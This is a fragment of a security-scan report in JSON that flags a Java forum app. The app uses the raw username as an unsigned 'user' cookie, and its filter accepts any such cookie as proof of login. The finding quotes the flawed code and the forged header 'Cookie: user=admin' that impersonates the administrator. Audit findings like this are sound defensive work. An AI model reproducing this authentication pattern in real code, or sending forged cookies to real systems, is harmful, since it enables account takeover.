          "ruleId": "session-management",
          "level": "error",
          "message": {
            "text": "AuthenticationController.setCookie() creates the application's sole session token by storing the authenticated username verbatim in a cookie:\n\nCookie cookie = new Cookie(\"user\", username);   // line 56\ncookie.setPath(\"/\");\ncookie.setMaxAge(-1);\nresponse.addCookie(cookie);\n\nThere is no session ID, no HMAC signature, and no server-side session store. AuthenticationFilter.doFilter() considers any HTTP request that merely carries a cookie named \"user\" (regardless of value) as authenticated:\n\nboolean loggedIn = cookies != null\n        && stream(cookies).anyMatch(c -> \"user\".equals(c.getName()));\n\nAny attacker can therefore:\nSend Cookie: user=admin to instantly impersonate the administrator.\nSend Cookie: user=<any valid username> to impersonate any forum member.\n\nNo valid credentials, no session lookup, and no server-side state are required. This completely undermines the entire authentication mechanism.",
            "markdown": "\n`AuthenticationController.setCookie()` creates the application's sole session token by storing the authenticated username verbatim in a cookie:\n\n```java\nCookie cookie = new Cookie(\"user\", username);   // line 56\ncookie.setPath(\"/\");\ncookie.setMaxAge(-1);\nresponse.addCookie(cookie);\n```\n\nThere is no session ID, no HMAC signature, and no server-side session store. `AuthenticationFilter.doFilter()` considers any HTTP request that merely carries a cookie named `\"user\"` (regardless of value) as authenticated:\n\n```java\nboolean loggedIn = cookies != null\n        && stream(cookies).anyMatch(c -> \"user\".equals(c.getName()));\n```\n\nAny attacker can therefore:\n- Send `Cookie: user=admin` to instantly impersonate the administrator.\n- Send `Cookie: user=<any valid username>` to impersonate any forum member.\n\nNo valid credentials, no session lookup, and no server-side state are required. This completely undermines the entire authentication mechanism.\n"
          },
